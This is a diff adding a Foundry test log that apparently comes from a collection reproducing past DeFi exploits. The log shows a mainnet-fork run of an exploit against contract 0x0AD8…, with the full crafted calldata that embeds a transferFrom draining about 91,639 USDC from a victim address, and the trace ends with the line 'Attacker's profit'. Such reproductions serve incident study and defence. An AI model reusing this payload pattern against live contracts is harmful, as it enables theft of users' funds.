@@ -1,0 +1,66 @@
+Compiling 27 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.18s
+Compiler run successful with warnings:
+Warning (9302): Return value of low-level calls not used.
+  --> src/test/2022-11/MEV_0ad8_exp.sol:35:9:
+   |
+35 |         vulnerableContract.call(payload);
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 296.03ms (107.01µs CPU time)
+
+Ran 1 test for src/test/2022-11/MEV_0ad8_exp.sol:Exploit
+[PASS] testHack() (gas: 77537)
+Logs:
+  Attacker's profit: 91639 USDC
+
+Traces:
+  [82337] Exploit::testHack()
+    ├─ [0] VM::createSelectFork("mainnet", 15926096 [1.592e7])
+    │   └─ ← [Return] 0
+    ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x211B6a1137BF539B2750e02b9E525CF5757A35aE) [staticcall]
+    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x211B6a1137BF539B2750e02b9E525CF5757A35aE) [delegatecall]
+    │   │   └─ ← [Return] 91638112249 [9.163e10]
+    │   └─ ← [Return] 91638112249 [9.163e10]
+    ├─ [56950] 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4::090f88ca(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000211b6a1137bf539b2750e02b9e525cf5757a35ae000000000000000000000000ae39a6c2379bef53334ea968f4c711c8cf3898b600000000000000000000000000000000000000000000000000000015560e9ff900000000000000000000000000000000000000000000000000000000)
+    │   ├─ [10148] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0)
+    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [26392] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x211B6a1137BF539B2750e02b9E525CF5757A35aE, 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, 91638112249 [9.163e10])
+    │   │   ├─ [25597] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(0x211B6a1137BF539B2750e02b9E525CF5757A35aE, 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, 91638112249 [9.163e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x211B6a1137BF539B2750e02b9E525CF5757A35aE, to: 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6, value: 91638112249 [9.163e10])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [8148] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, 0)
+    │   │   ├─ emit Transfer(from: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, to: 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [4520] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   ├─ emit Approval(owner: 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4, spender: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop] 
+    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6) [staticcall]
+    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6) [delegatecall]
+    │   │   └─ ← [Return] 91639112249 [9.163e10]
+    │   └─ ← [Return] 91639112249 [9.163e10]
+    ├─ [0] console::log("Attacker's profit: %s USDC", 91639 [9.163e4]) [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 319.15ms (318.96ms CPU time)
+
+Ran 2 test suites in 620.15ms (615.18ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
